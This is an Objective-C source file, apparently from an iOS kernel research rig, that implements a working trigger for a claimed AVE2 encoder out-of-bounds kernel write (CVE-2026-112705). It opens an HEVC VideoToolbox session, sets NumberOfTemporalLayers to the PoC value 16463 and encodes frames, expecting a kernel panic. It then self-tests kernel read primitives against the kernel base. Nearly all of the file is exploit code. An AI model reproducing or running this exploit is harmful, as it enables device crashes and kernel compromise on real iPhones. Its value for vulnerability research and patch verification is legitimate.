//
//  P142AVETemporal.m — the AVE2 TEMPORAL-LAYERS KNOB (CVE-2026-112705). p142.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Vector credit: MMdAS (repo MchinaMd57764/AVETemporalPoC-CVE-2026-112705),
//  original discovery credited to the Calif/Chollima team. Session laws
//  copied from AVEVTSmoke (the pack's own VT law: create → prepare → one
//  encode → complete → invalidate). The knob = NumberOfTemporalLayers via
//  VTSessionSetProperty with the plain-string key (the PoC's property).
//
//  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill);
//  panic = the count-law receipt, BY DESIGN; one value per tap;
//  hasKread stays kread32-gated; tokens/logs never leave the device.
//

#import "P142AVETemporal.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P142_BUILD   @"p142-avetemporal-v3-boardgate"
#define P142_KEY     @"NumberOfTemporalLayers"
#define P142_DEFAULT 16463         /* the PoC's trigger threshold */
#define P142_SURVIVE 16462         /* the PoC's surviving value */

static void p142_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P142R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p142_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p142", arms, 1, &sr, 0, "p142 avetemporal auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p142", 0, outcome);
}

@implementation P142AVETemporal

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p142_avetemporal_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p142 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P142_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[vector credit] CVE-2026-112705 borrowed: MMdAS PoC (A V E 2 kernel");
    L(@"  OOB write via NumberOfTemporalLayers=16463; 16462 survives; 27.2");
    L(@"  added the -12900 pre-check). The lab's fill-store conversion class");
    L(@"  (the p088/p112 geometry) with a LIVE count knob.");
    L(@"[!] PANIC-POSSIBLE BY DESIGN = the count-law receipt; ONE encode");
    L(@"  per tap; knob value = Documents/p142_layers.txt (decimal; 0 =");
    L(@"  the 16462 survival control, blank = 16463 the PoC row).");

    /* the knob */
    long layers = P142_DEFAULT;
    NSString *knob = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:@"p142_layers.txt"]
        encoding:NSUTF8StringEncoding error:nil];
    if (knob) {
        long v = strtol(knob.UTF8String, NULL, 10);
        if (v > 0) layers = v;
        Lf(@"[*] knob file present: layers=%ld", layers);
    } else {
        Lf(@"[*] no knob file: layers=%ld (the PoC row)", layers);
    }

    id<NSObject> nothing = nil; (void)nothing;   /* clang tidy */

    /* ---- the session (AVEVTSmoke law) ---- */
    /* v2 faithful: HEVC (the PoC's codec) + the property order with
       BaseLayerFrameRate BEFORE the count (the layer-array feeder). */
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, p142_flushCB, (__bridge void *)docs, &session);
    if (st != noErr || !session) {
        Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        p142_bandit("nocreate"); return P142R();
    }
    L(@"[1] session created (HEVC 1280x720)");

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                         kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowTemporalCompression,
                         kCFBooleanTrue);
    OSStatus stEfr = VTSessionSetProperty(session,
        kVTCompressionPropertyKey_ExpectedFrameRate,
        (__bridge CFTypeRef)@30);
    int32_t blr = 15;
    CFNumberRef nblr = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &blr);
    OSStatus stBlr = VTSessionSetProperty(session, (__bridge CFStringRef)@"BaseLayerFrameRate", nblr);
    CFRelease(nblr);
    Lf(@"[2a] frame-rate law set: Efr st=%d Blr st=%d", (int)stEfr, (int)stBlr);

    CFStringRef key = (__bridge CFStringRef)P142_KEY;
    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
                                     kCFNumberSInt32Type, &(int32_t){ (int32_t)layers });
    st = VTSessionSetProperty(session, key, val);
    CFRelease(val);
    Lf(@"[2b] SetProperty(NumberOfTemporalLayers=%ld) st=%d (0 = set;"
       @" -12900 = not-supported/pre-check row; -12912/-6662 = the caps",
       layers, (int)st);

    /* the readback: what did the session store? */
    {
        void *rb = NULL;
        st = VTSessionCopyProperty(session, key, kCFAllocatorDefault, &rb);
        if (st == 0 && rb) {
            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                             kCFNumberSInt32Type, &rv);
            Lf(@"[2c] readback = %d (0 = the session DROPPED it)", rv);
            CFRelease(rb);
        } else {
            Lf(@"[2c] readback st=%d", (int)st);
        }
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[3] Prepare st=%d", (int)st);
    if (st != noErr) {
        L(@"    Prepare refused = the pre-encode wall (the 27.2-class law");
        L(@"    may already exist on this train — the honest row regardless)");
        VTCompressionSessionInvalidate(session); CFRelease(session);
        p142_bandit("prepare-refused"); return P142R();
    }

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        p142_bandit("nopb"); return P142R();
    }

    L(@"[4] the ENCODE battery (the PoC's mode: 40 frames, bounded)");
    OSStatus firstSt = 0;
    for (int i = 0; i < 40; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 0) firstSt = est;
    }
    Lf(@"[4] encode battery returned; first st=%d", (int)firstSt);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[5] session invalidated (a clean return = survived this count)");

    /* the honest KRW self-test tail (survival only; never a read claim).
       v3 gate law: the board-first route — the app-sandbox wall zeroes the
       libkrw glue's kbase() (tonight's mini law), so the gate checks the
       BOARD's committed slide + its registered kread32Fn, and falls back
       to the lane API. */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)",
               (unsigned long long)kb);
            p142_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@)",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p142_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
    }
    Lf(@"=== p142 end %@ ===", LabLocalMilitaryNow());
    return P142R();
}

@end